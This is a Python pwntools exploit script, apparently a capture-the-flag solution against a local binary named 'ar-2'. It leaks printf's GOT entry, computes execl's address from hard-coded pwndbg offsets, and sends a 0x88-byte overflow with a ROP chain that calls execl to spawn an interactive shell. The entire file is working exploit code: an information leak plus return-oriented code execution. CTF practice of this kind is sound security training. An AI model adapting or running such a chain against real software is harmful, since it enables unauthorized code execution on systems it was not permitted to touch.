#!/usr/bin/env python

from pwn import *

p = process("./ar-2")

printf_got = p.elf.got['printf']

print(p.recv())
p.sendline("8")
print(p.recv())
p.sendline(hex(printf_got))

data = p.recv()
print(repr(data))
d = data.split('\n')[1][0:8]
printf_addr = u64(d)
print(hex(printf_addr))

"""
pwndbg> print printf
$1 = {<text variable, no debug info>} 0x7ffff7a62800 <__printf>
pwndbg> print execl
$2 = {<text variable, no debug info>} 0x7ffff7ad9a20 <__GI_execl>
pwndbg> x/s 0x400020
0x400020:       "@"
"""

execl_addr = printf_addr - 0x7ffff7a62800 + 0x7ffff7ad9a20

"""
0x0000000000400a33 : pop rdi ; ret
0x0000000000400a31 : pop rsi ; pop r15 ; ret
"""
pop_rdi_ret = 0x400a33
pop_rsi_r15_ret = 0x400a31

buf = "A" * 0x88
buf += p64(pop_rdi_ret)
buf += p64(0x400020)
buf += p64(pop_rsi_r15_ret)
buf += p64(0)
buf += p64(0)
buf += p64(execl_addr)

p.sendline(buf)

p.interactive()
